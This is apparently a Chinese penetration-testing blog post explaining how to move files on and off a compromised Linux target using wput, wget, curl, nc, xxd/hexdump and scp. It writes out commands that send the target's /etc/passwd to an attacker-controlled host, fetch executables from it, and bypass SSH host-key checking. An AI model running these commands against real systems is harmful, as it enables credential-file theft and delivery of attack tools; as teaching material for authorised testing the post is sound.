---
title: linux 内网传输
subtitle:
date: 2024-08-15T09:31:01+08:00
slug: 51
draft:  false
author: 
  name: 东隅
  link:
  email: 735587142
  avatar: 
description:
keywords:
license:
comment: false
weight: 0
tags:
  - 攻防
  - 内网渗透
categories:
  - 攻防
hiddenFromHomePage: false
hiddenFromSearch: false
hiddenFromRss: false
hiddenFromRelated: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: true
  url:

# See details front matter: https://fixit.lruihao.cn/documentation/content-management/introduction/#front-matter
---

<!--more-->

> 有时候我们拿到一个不能上传shell，但可以命令执行的windows服务器时，可以通过多种方法进行文件上传和下载。



# Wput/Wget

Wput是一款linux环境下用于向ftp服务器上传的工具。

例如把靶机的/etc/passwd文件上传至ftp服务器：

```javascript
wput ./passwd ftp://账号:密码@ftp服务器ip
```



Wput用于上传，Wget则用于下载。

Wget支持HTTP，HTTPS，FTP协议进行文件下载。例如使用靶机下载hash.exe:

```javascript
wget --ftp-user=username --ftp-password=password ftp://192.168.3.1/hash.exe
```

也可以通过http的方式下载

```javascript
wget http://192.168.3.1/editor.exe
```





# Curl

curl可以用来http下载

```shell
curl –O http://192.168.3.1/editor.exe
```



# NC

NETCAT是kali中自带的一款功能强大的工具，我们可以通过它来文件传输。

例如传输靶机的passwd文件。

首先在本地开启监听，并将接收的内容保存为test.txt:

```
nc -nvv -lp 4444 > test.txt
```

靶机如果没有nc，可以先通过以下命令安装：

```
yum install -y nc
```

在靶机将目标文件传至kali：

```javascript
nc 192.168.3.144 4444 < /etc/passwd
```



# **xxd**

xxd工具的作用是将一个文件以十六进制的形式显示出来。

我们可以利用该方法将靶机中的可执行文件“复制”出来。如显示hash.exe

```javascript
xxd hash.exe
```

将16进制内容复制出来，在本地造一个一模一样的文本,去掉左右多余的内容，替换掉空格、换行符：

打开一个十六进制编辑器导入以上内容，如010editor

另存为hash.exe并打开，程序可以正常运行

当然除了xxd工具，其他如hexdump也可以达到相同的效果：

```javascript
hexdump -C hash.exe
```



# scp

Scp通过ssh进行数据传输，如果知道用户名和密码，也可以通过它来进行文件传输。例如，从本地复制文件到远程：

```javascript
scp /etc/passwd root@192.168.3.146:/root/Desktop/password
```

从对端服务器下载文件：

```javascript
scp root@192.168.3.146:/root/Desktop/payload.txt /root/payload.txt
```

如果出现如下报错：

Theauthenticity of host 192.168.0.xxx can't be established.

可以先按以下方法进行操作：

```javascript
ssh -o StrictHostKeyChecking=no 192.168.3.146
```







































